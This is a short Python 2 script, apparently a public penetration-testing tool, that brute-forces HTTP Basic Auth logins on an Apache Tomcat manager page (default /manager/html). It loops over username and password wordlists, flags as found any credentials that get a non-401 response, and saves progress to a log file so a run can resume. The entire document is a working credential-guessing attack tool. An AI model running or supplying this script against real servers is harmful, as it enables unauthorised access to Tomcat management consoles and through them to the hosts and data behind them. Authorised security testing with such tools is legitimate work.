"""
    Tomcat bruteforce
    Author: @itsecurityco
"""

import os
import sys
import getopt
import base64
import requests
from time import sleep

def usage():
    print("## Usage ##")
    print("tomcat.py --host 127.0.0.1 --port <8080> --path </manager/html> --usr path_file --pwd path_file")

def info(host, port, path, usr_path, pwd_path):
    print("# Target: http://%s:%d%s" % (host, port, path))
    print("# Usernames: %s" % usr_path)
    print("# Passwords: %s" % pwd_path)
    raw_input("# Press any key to start ...")

def log(log_file):
    if os.path.isfile(log_file):
        handle = open(log_file, "r")
        session = handle.read().strip().split("::::::")
        handle.close()
        os.remove(log_file)
        return session
    else:
        return False

def bruteforce(host, port, path, usr_path, pwd_path, log_file):
    usernames = open(usr_path, 'r').read().splitlines()
    passwords = open(pwd_path, 'r').read().splitlines()
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Cache-Control": "max-age=0"}
    session = log(log_file)
    creds = {}

    for pwd in passwords:
        for usr in usernames:
            if session != False:
                if session[0] == usr and session[1] == pwd:
                    print("# Reading %s file from '%s:%s' " % (log_file, usr, pwd))
                    session = False
                    sleep(5)
                else:
                    continue

            headers["Authorization"] = "Basic %s" % base64.b64encode("%s:%s" % (usr, pwd))
            print("[*] Trying '%s:%s' ..." % (usr, pwd))
            try:
                res = requests.get("http://%s:%d%s" % (host, port, path), headers=headers)
                if res.status_code != 401:
                    print("[!] Credentials found: %s:%s" % (usr, pwd))
                    creds[usr] = pwd    
            except:
                handle = open(log_file, "w")
                handle.write("%s::::::%s" % (usr, pwd))
                handle.close()

    if len(creds) > 0:
        print("## Summary ##")
        print(creds)
    else:
        print("## No passwords found ##")

def main():
    port = 8080 
    path = "/manager/html"
    log_file = "tomcat.log"
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "host=", "port=", "path=", "usr=", "pwd="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        exit(1)
    
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            exit(0)
        elif opt == "--host":
            host = arg
        elif opt == "--port":
            port = int(arg)
        elif opt == "--path":
            path = arg
        elif opt == "--usr":
            usr_path = arg
        elif opt == "--pwd":
            pwd_path = arg
        else:
            assert False, "unhandled option"
    
    if len(opts) == 0:
     usage()
     exit(0)

    info(host, port, path, usr_path, pwd_path)
    bruteforce(host, port, path, usr_path, pwd_path, log_file)

if __name__ == "__main__":
    main()
